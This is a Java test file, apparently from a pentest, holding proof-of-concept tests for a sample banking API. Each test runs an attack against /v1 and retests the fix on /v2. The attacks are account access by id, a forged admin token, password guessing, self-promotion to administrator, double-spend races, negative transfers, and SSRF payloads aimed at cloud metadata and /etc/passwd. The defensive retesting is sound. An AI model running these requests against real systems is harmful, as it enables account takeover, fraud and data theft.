package br.com.brecha;

import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.annotation.DirtiesContext;

import java.io.IOException;
import java.math.BigDecimal;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Prova de conceito de cada achado do relatório, contra a aplicação rodando.
 *
 * <p>Para cada achado há dois testes: o ataque funciona no /v1 e o mesmo
 * ataque é barrado no /v2. O primeiro é a evidência do pentest; o segundo é
 * o reteste da correção. O contexto é recriado a cada teste porque vários
 * ataques mudam o estado do banco.
 *
 * <p>Dados simulados: Ana (cliente 1, conta 100, saldo 500), Bruno (cliente 2,
 * conta 200, saldo 8000) e Operação (cliente 3, administrador).
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@DirtiesContext(classMode = DirtiesContext.ClassMode.AFTER_EACH_TEST_METHOD)
@DisplayName("Exploração e reteste")
class ExploracaoTest {

    private static final Pattern TOKEN = Pattern.compile("\"token\"\\s*:\\s*\"([^\"]+)\"");

    @Value("${local.server.port}")
    int porta;

    private final HttpClient http = HttpClient.newHttpClient();

    record Resposta(int status, String corpo) { }

    Resposta chamar(String metodo, String caminho, String token, String json) throws Exception {
        var req = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + porta + caminho))
                .header("Content-Type", "application/json")
                .method(metodo, json == null ? HttpRequest.BodyPublishers.noBody() : HttpRequest.BodyPublishers.ofString(json));
        if (token != null) {
            req.header("Authorization", "Bearer " + token);
        }
        HttpResponse<String> r = http.send(req.build(), HttpResponse.BodyHandlers.ofString());
        return new Resposta(r.statusCode(), r.body());
    }

    String entrar(String versao, String email, String senha) throws Exception {
        Resposta r = chamar("POST", "/" + versao + "/sessoes", null,
                "{\"email\":\"" + email + "\",\"senha\":\"" + senha + "\"}");
        Matcher m = TOKEN.matcher(r.corpo());
        assertThat(m.find()).as("login de %s em %s: %s", email, versao, r).isTrue();
        return m.group(1);
    }

    String ana(String versao) throws Exception {
        return entrar(versao, "ana@exemplo.com.br", "ana-senha-2026");
    }

    BigDecimal saldo(String token, String versao, long conta) throws Exception {
        Matcher m = Pattern.compile("\"saldo\"\\s*:\\s*(-?[0-9.]+)").matcher(chamar("GET", "/" + versao + "/contas/" + conta, token, null).corpo());
        assertThat(m.find()).isTrue();
        return new BigDecimal(m.group(1));
    }

    @Nested
    @DisplayName("BRECHA-001: objeto de outro cliente pelo id (BOLA)")
    class Bola {

        @Test
        void v1LeContaDeOutroCliente() throws Exception {
            Resposta r = chamar("GET", "/v1/contas/200", ana("v1"), null);
            assertThat(r.status()).isEqualTo(200);
            assertThat(r.corpo()).contains("\"clienteId\":2").contains("8000");
        }

        @Test
        void v1TransfereDaContaDeOutroCliente() throws Exception {
            Resposta r = chamar("POST", "/v1/transferencias", ana("v1"),
                    "{\"origem\":200,\"destino\":100,\"valor\":1000}");
            assertThat(r.status()).isEqualTo(200);
            assertThat(saldo(ana("v1"), "v1", 100)).isEqualByComparingTo("1500");
        }

        @Test
        void v2NaoMostraContaDeOutroCliente() throws Exception {
            assertThat(chamar("GET", "/v2/contas/200", ana("v2"), null).status()).isEqualTo(404);
            assertThat(chamar("GET", "/v2/contas/100", ana("v2"), null).status()).isEqualTo(200);
        }

        @Test
        void v2IgnoraOrigemVindaDoCliente() throws Exception {
            // O /v2 nem tem campo de origem: o pedido com "origem":200 sai da conta da Ana.
            chamar("POST", "/v2/transferencias", ana("v2"), "{\"origem\":200,\"destino\":200,\"valor\":100}");
            assertThat(saldo(ana("v2"), "v2", 100)).isEqualByComparingTo("400");
        }
    }

    @Nested
    @DisplayName("BRECHA-002: token forjável e login sem limite")
    class Autenticacao {

        @Test
        void v1AceitaTokenForjadoDeAdministrador() throws Exception {
            String forjado = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString("3:ADMIN".getBytes(StandardCharsets.UTF_8));
            Resposta r = chamar("GET", "/v1/admin/clientes", forjado, null);
            assertThat(r.status()).isEqualTo(200);
            assertThat(r.corpo()).contains("bruno@exemplo.com.br");
        }

        @Test
        void v2RecusaTokenAlterado() throws Exception {
            String token = ana("v2");
            String[] partes = token.split("\\.");
            String conteudo = new String(Base64.getUrlDecoder().decode(partes[0]), StandardCharsets.UTF_8)
                    .replace("1:CLIENTE", "3:ADMIN");
            String alterado = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(conteudo.getBytes(StandardCharsets.UTF_8)) + "." + partes[1];
            assertThat(chamar("GET", "/v2/admin/clientes", alterado, null).status()).isEqualTo(401);
        }

        @Test
        void v1NaoLimitaTentativasDeSenha() throws Exception {
            for (int i = 0; i < 20; i++) {
                chamar("POST", "/v1/sessoes", null, "{\"email\":\"ana@exemplo.com.br\",\"senha\":\"errada" + i + "\"}");
            }
            assertThat(entrar("v1", "ana@exemplo.com.br", "ana-senha-2026")).isNotBlank();
        }

        @Test
        void v2TravaDepoisDeCincoErros() throws Exception {
            for (int i = 0; i < 5; i++) {
                assertThat(chamar("POST", "/v2/sessoes", null,
                        "{\"email\":\"ana@exemplo.com.br\",\"senha\":\"errada" + i + "\"}").status()).isEqualTo(401);
            }
            Resposta certa = chamar("POST", "/v2/sessoes", null,
                    "{\"email\":\"ana@exemplo.com.br\",\"senha\":\"ana-senha-2026\"}");
            assertThat(certa.status()).isEqualTo(401);
        }
    }

    @Nested
    @DisplayName("BRECHA-003: dado demais na resposta e atribuição em massa (BOPLA)")
    class Bopla {

        @Test
        void v1DevolveHashDeSenhaECpfCompleto() throws Exception {
            Resposta r = chamar("GET", "/v1/clientes/me", ana("v1"), null);
            assertThat(r.corpo()).contains("senhaHash").contains("52998224725");
        }

        @Test
        void v1DeixaOClienteSePromoverAAdministrador() throws Exception {
            String token = ana("v1");
            Resposta r = chamar("PATCH", "/v1/clientes/me", token,
                    "{\"perfil\":\"ADMIN\",\"limiteDeCredito\":999999}");
            assertThat(r.corpo()).contains("\"perfil\":\"ADMIN\"").contains("999999");
            // O token antigo ainda diz CLIENTE; o próximo login já sai como ADMIN.
            String novo = ana("v1");
            assertThat(new String(Base64.getUrlDecoder().decode(novo), StandardCharsets.UTF_8)).endsWith(":ADMIN");
        }

        @Test
        void v2MascaraCpfENaoDevolveHash() throws Exception {
            Resposta r = chamar("GET", "/v2/clientes/me", ana("v2"), null);
            assertThat(r.corpo()).doesNotContain("senhaHash").doesNotContain("52998224725").contains("***.***.***-25");
        }

        @Test
        void v2IgnoraPerfilELimiteNoCorpo() throws Exception {
            chamar("PATCH", "/v2/clientes/me", ana("v2"), "{\"perfil\":\"ADMIN\",\"limiteDeCredito\":999999}");
            assertThat(chamar("GET", "/v2/admin/clientes", ana("v2"), null).status()).isEqualTo(403);
        }
    }

    @Nested
    @DisplayName("BRECHA-004: consumo de recurso sem limite")
    class Recurso {

        @Test
        void v1MontaExtratoDeQualquerTamanho() throws Exception {
            Resposta r = chamar("GET", "/v1/contas/100/extrato?dias=200000", ana("v1"), null);
            assertThat(r.status()).isEqualTo(200);
            assertThat(r.corpo().split("\"dia\"").length - 1).isEqualTo(200000);
        }

        @Test
        void v2LimitaANoventaDias() throws Exception {
            assertThat(chamar("GET", "/v2/contas/100/extrato?dias=200000", ana("v2"), null).status()).isEqualTo(400);
            assertThat(chamar("GET", "/v2/contas/100/extrato?dias=90", ana("v2"), null).status()).isEqualTo(200);
        }
    }

    @Nested
    @DisplayName("BRECHA-005: função de administrador sem conferir o perfil (BFLA)")
    class Bfla {

        @Test
        void v1ListaTodosOsClientesParaQualquerUm() throws Exception {
            Resposta r = chamar("GET", "/v1/admin/clientes", ana("v1"), null);
            assertThat(r.status()).isEqualTo(200);
            assertThat(r.corpo()).contains("11144477735");
        }

        @Test
        void v2ExigePerfilDeAdministrador() throws Exception {
            assertThat(chamar("GET", "/v2/admin/clientes", ana("v2"), null).status()).isEqualTo(403);
            String admin = entrar("v2", "operacao@exemplo.com.br", "operacao-senha-2026");
            Resposta r = chamar("GET", "/v2/admin/clientes", admin, null);
            assertThat(r.status()).isEqualTo(200);
            assertThat(r.corpo()).doesNotContain("senhaHash").doesNotContain("11144477735");
        }
    }

    @Nested
    @DisplayName("BRECHA-006: transferência sem trava e com valor negativo")
    class Transferencias {

        int disparar(String versao, String token, String corpo) throws Exception {
            var pool = Executors.newFixedThreadPool(10);
            try {
                List<Future<Integer>> futuros = new ArrayList<>();
                for (int i = 0; i < 10; i++) {
                    Callable<Integer> c = () -> chamar("POST", "/" + versao + "/transferencias", token, corpo).status();
                    futuros.add(pool.submit(c));
                }
                int sucessos = 0;
                for (Future<Integer> f : futuros) {
                    if (f.get() == 200) {
                        sucessos++;
                    }
                }
                return sucessos;
            } finally {
                pool.shutdown();
            }
        }

        @Test
        void v1GastaOMesmoSaldoVariasVezes() throws Exception {
            String token = ana("v1");
            int sucessos = disparar("v1", token, "{\"origem\":100,\"destino\":200,\"valor\":500}");
            assertThat(sucessos).isGreaterThan(1);
            assertThat(saldo(token, "v1", 100)).isNegative();
        }

        @Test
        void v1AceitaValorNegativo() throws Exception {
            String token = ana("v1");
            chamar("POST", "/v1/transferencias", token, "{\"origem\":100,\"destino\":200,\"valor\":-3000}");
            assertThat(saldo(token, "v1", 100)).isEqualByComparingTo("3500");
        }

        @Test
        void v2DeixaPassarSoUma() throws Exception {
            String token = ana("v2");
            int sucessos = disparar("v2", token, "{\"destino\":200,\"valor\":500}");
            assertThat(sucessos).isEqualTo(1);
            assertThat(saldo(token, "v2", 100)).isEqualByComparingTo("0");
        }

        @Test
        void v2RecusaValorNegativo() throws Exception {
            assertThat(chamar("POST", "/v2/transferencias", ana("v2"), "{\"destino\":200,\"valor\":-3000}").status())
                    .isEqualTo(400);
        }
    }

    @Nested
    @DisplayName("BRECHA-007: SSRF na importação de comprovante")
    class Ssrf {

        HttpServer interno;

        @BeforeEach
        void subirServicoInterno() throws IOException {
            // Faz o papel de um serviço que só responde dentro da rede.
            interno = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
            interno.createContext("/admin/chaves", troca -> {
                byte[] corpo = "chave-interna-de-teste".getBytes(StandardCharsets.UTF_8);
                troca.sendResponseHeaders(200, corpo.length);
                troca.getResponseBody().write(corpo);
                troca.close();
            });
            interno.start();
        }

        @AfterEach
        void derrubar() {
            interno.stop(0);
        }

        String alvo() {
            return "http://127.0.0.1:" + interno.getAddress().getPort() + "/admin/chaves";
        }

        @Test
        void v1LeServicoInterno() throws Exception {
            Resposta r = chamar("POST", "/v1/comprovantes/importar", ana("v1"), "{\"url\":\"" + alvo() + "\"}");
            assertThat(r.corpo()).contains("chave-interna-de-teste");
        }

        @Test
        void v2RecusaRedeInternaEHostForaDaLista() throws Exception {
            String token = ana("v2");
            for (String url : List.of(alvo(), "https://169.254.169.254/latest/meta-data/",
                    "https://comprovantes.exemplo.com.br.atacante.test/x", "file:///etc/passwd")) {
                Resposta r = chamar("POST", "/v2/comprovantes/importar", token, "{\"url\":\"" + url + "\"}");
                assertThat(r.status()).as(url).isEqualTo(422);
                assertThat(r.corpo()).doesNotContain("chave-interna-de-teste");
            }
        }
    }

    @Nested
    @DisplayName("BRECHA-008: erro com pilha para o cliente")
    class Erros {

        @Test
        void v1DevolveAPilha() throws Exception {
            Resposta r = chamar("GET", "/v1/contas/999999", ana("v1"), null);
            assertThat(r.corpo()).contains("java.util.NoSuchElementException").contains("\"pilha\"").contains("br.com.brecha");
        }

        @Test
        void v2DevolveSoOProblema() throws Exception {
            Resposta r = chamar("GET", "/v2/contas/999999", ana("v2"), null);
            assertThat(r.status()).isEqualTo(404);
            assertThat(r.corpo()).doesNotContain("Exception").doesNotContain("br.com.brecha");
        }
    }

    @Nested
    @DisplayName("BRECHA-009: versão antiga da API ainda no ar")
    class Legado {

        @Test
        void v0ListaClientesSemLogin() throws Exception {
            Resposta r = chamar("GET", "/v0/clientes", null, null);
            assertThat(r.status()).isEqualTo(200);
            assertThat(r.corpo()).contains("52998224725");
        }
    }
}
